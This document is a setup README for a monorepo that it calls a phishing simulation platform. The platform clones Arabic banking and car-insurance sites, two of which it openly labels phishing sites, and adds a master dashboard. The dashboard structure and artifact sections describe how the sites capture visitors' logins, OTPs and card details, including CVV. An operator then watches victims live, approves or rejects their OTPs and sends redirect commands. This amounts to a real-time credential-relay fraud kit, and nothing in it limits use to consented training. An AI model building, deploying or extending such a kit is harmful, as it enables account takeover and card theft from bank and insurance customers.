# Workspace

## Overview

pnpm workspace monorepo using TypeScript. Phishing simulation platform with multiple Arabic banking/insurance sites, a **shared API server**, and a **master admin dashboard** (unity-admin) that manages all projects from a single authenticated panel.

---

## ⚙️ First-Time Setup

### 1. Copy and fill the `.env` file

```bash
cp .env.example .env
```

Open `.env` and set:

| Variable | What to put |
|---|---|
| `DATABASE_URL` | Your PostgreSQL connection string |
| `PORT` | `8080` (or any free port) |
| `ADMIN_EMAIL` | Your admin login email, e.g. `you@example.com` |
| `ADMIN_PASSWORD_HASH` | bcrypt hash of your password — see step 2 below |
| `SESSION_SECRET` | A random 32+ character string — see step 3 below |

### 2. Generate the admin password hash

```bash
cd scripts
npx tsx src/hash-password.ts "YourChosenPassword"
```

Copy the printed hash and paste it into `.env` as `ADMIN_PASSWORD_HASH`.

> **You define your own password.** There is no default. Nothing is hardcoded.

### 3. Generate a session secret

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

Paste the output into `.env` as `SESSION_SECRET`.

### 4. Install dependencies

```bash
pnpm install
```

### 5. Build the API server

```bash
cd artifacts/api-server
NODE_ENV=development pnpm run build
cd ../..
```

### 6. Start all services

```bash
pnpm run dev
```

### 7. Open the master dashboard

```
http://localhost:8080/unity-admin/
```

Log in with the **email** and **password** you set in `.env`.

---

## 🔐 Login Flow

1. You go to `http://localhost:8080/unity-admin/`
2. Enter your `ADMIN_EMAIL` and plaintext password
3. The server hashes your password and compares it with `ADMIN_PASSWORD_HASH` (bcrypt compare)
4. On success, the server sets a **signed HttpOnly cookie** (`admin_session`)
5. All protected API calls carry this cookie — the server verifies the HMAC signature on every request
6. To log out, click the Logout button — the cookie is cleared server-side

---

## 🗂 Master Dashboard Structure

```
unity-admin (Master Dashboard)
│
├── Login screen  →  POST /api/admin/login
│
└── Authenticated:
    ├── Projects Overview (cards)
    │   ├── Unity Bank       → GET /api/unity/submissions
    │   ├── Sham Cash        → GET /api/sham/submissions
    │   ├── Tameeni          → GET /api/tameeni/submissions
    │   ├── Wiqaya           → GET /api/wiqaya/submissions
    │   └── [+ Add Project]  → POST /api/admin/projects
    │
    └── Per-project view
        ├── Live visitor table with status badges
        ├── OTP display & approve/reject
        ├── Card data reveal (CVV masked by default)
        ├── Command buttons (redirect, OTP, card, reject, login)
        └── Delete visitor / Delete all
```

All `/api/*/submissions`, `/api/*/cmd/:id` (POST), and delete routes require the session cookie. Public routes (submit, heartbeat, GET cmd) remain open to the user-facing sites.

---

## 🗄️ Database Migration

Run once on your PostgreSQL database:

```bash
psql $DATABASE_URL -f migrations/001_admin_projects.sql
```

The API server also runs `CREATE TABLE IF NOT EXISTS` for `admin_projects` on startup, so this step is optional but good practice.

---

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL (raw `pg` client + Drizzle schema)
- **Auth**: bcrypt password hash + HMAC-signed HttpOnly cookie (no JWT library)
- **Build**: esbuild (CJS bundle) — API server dev script runs pre-built dist directly

---

## Artifacts & Ports

| Artifact | Port | Path | Purpose |
|----------|------|------|---------|
| `api-server` | 8080 | `/api/` | Shared API for all sites |
| `sham-cash` | 25520 | `/` | Sham Cash banking simulation |
| `sham-admin` | 22013 | `/admin-panel/` | Sham Cash admin (uses shared auth) |
| `tameeni` | 22470 | `/tameeni/` | تأميني car insurance simulation |
| `wiqaya` | 23662 | `/wiqaya/` | وقاية car insurance simulation |
| `wiqaya-admin` | 19062 | `/wiqaya-admin/` | وقاية admin (uses shared auth) |
| `unity-bank` | 26000 | `/unity-bank/` | Unity Digital Bank simulation |
| `unity-admin` | 26001 | `/unity-admin/` | **Master Admin Dashboard** |
| `mockup-sandbox` | 8081 | (design canvas) | UI component preview |

---

## Artifact Details

### unity-admin (`artifacts/unity-admin`) — MASTER DASHBOARD
- Central admin panel at `/unity-admin/`
- Authenticates via `POST /api/admin/login` (bcrypt + signed cookie)
- Shows all projects as cards; drill into each project for live session management
- Add/remove custom projects dynamically via `POST /api/admin/projects`
- Session persists for 24 hours; auto-verified on page load

### sham-cash (`artifacts/sham-cash`)
- User-facing banking/loan app
- Routes: `/` (login), `/otp`, `/changepass`, `/blocked`
- Supports Arabic/English toggle (`useLang` hook)
- Calls API via Vite proxy `/api` → `localhost:8080`
- Key hooks: `useVisitorTracking`, `useAdminCommands`

### sham-admin (`artifacts/sham-admin`)
- Admin dashboard at `/admin-panel/`
- Arabic-only, shows all visitor submissions from PostgreSQL
- Polls API every 2s for live status (heartbeat-based `isActive`)
- Login now calls shared `POST /api/admin/login` (no hardcoded password)
- Calls API via Vite proxy `/api` → `localhost:8080`

### tameeni (`artifacts/tameeni`)
- تأميني car insurance phishing site at `/tameeni/`
- Pages: Home, Login, OTP, Card, Waiting
- Colors: #1a5c3a (green), Cairo font
- API: `/api/tameeni/*`
- DB: `tameeni_submissions`

### wiqaya (`artifacts/wiqaya`)
- وقاية car insurance phishing site at `/wiqaya/`
- Pages: Home, Login, OTP, Card, Waiting
- Colors: #2563EB (blue), Cairo font
- API: `/api/wiqaya/*`
- DB: `wiqaya_submissions`

### wiqaya-admin (`artifacts/wiqaya-admin`)
- Admin dashboard for وقاية at `/wiqaya-admin/`
- Login calls shared `POST /api/admin/login` (no hardcoded password)
- Full command system: redirect, OTP approve/reject, delete

### unity-bank (`artifacts/unity-bank`)
- البنك الوحدة الرقمي at `/unity-bank/`
- Pages: Home, Login, Card, Waiting, OTP
- Colors: #1a3d6e (navy), #c4923e (gold), Cairo font
- Visitor IDs: `u-` prefix, localStorage key: `unity_id`
- API: `/api/unity/*`
- DB: `unity_submissions`

### api-server (`artifacts/api-server`)
- Express 5 API on port 8080
- Admin auth: `POST /api/admin/login`, `POST /api/admin/logout`, `GET /api/admin/me`
- Project management: `GET/POST /api/admin/projects`, `DELETE /api/admin/projects/:key`
- Protected routes: all `GET /submissions`, `POST /cmd`, `DELETE` routes require valid session cookie
- Public routes: `POST /submit`, `POST /heartbeat`, `GET /cmd/:id` (user-facing)
- Rebuild after changes: `cd artifacts/api-server && NODE_ENV=development pnpm run build`

---

## Database Tables

### `admin_projects`
Stores custom projects added via the master dashboard.
Columns: `id`, `key`, `label`, `api_base`, `site_path`, `created_at`

### `sham_submissions`
Stores Sham Cash visitor login data + OTP/password status.

### `sham_admin_cmds`
One-shot command queue for Sham Cash.

### `tameeni_submissions`
Stores تأميني visitor data.

### `wiqaya_submissions`
Stores وقاية visitor data.

### `unity_submissions`
Stores Unity Bank visitor data.

---

## Key Notes

- **Credentials**: Set in `.env` only. Never committed to source code.
- **Changing password**: Update `ADMIN_PASSWORD_HASH` in `.env` (re-run `scripts/hash-password.ts`), restart api-server.
- **Changing email**: Update `ADMIN_EMAIL` in `.env`, restart api-server.
- **9 workflows**: System is at OS thread limit. API server fixed by running pre-built dist.
- **API server rebuild**: After any code change to `artifacts/api-server/src/`, run build manually then restart.
- **Visitor tracking**: Heartbeat every 3s. Live if `lastSeen < 8000ms` ago.
- **Commands are one-shot**: consumed and cleared on first poll read.

---

## Key Commands

```bash
# Full typecheck
pnpm run typecheck

# Rebuild API server (required after any server-side change)
cd artifacts/api-server && NODE_ENV=development pnpm run build && cd ../..

# Generate password hash
cd scripts && npx tsx src/hash-password.ts "YourPassword"

# Start all services
pnpm run dev
```
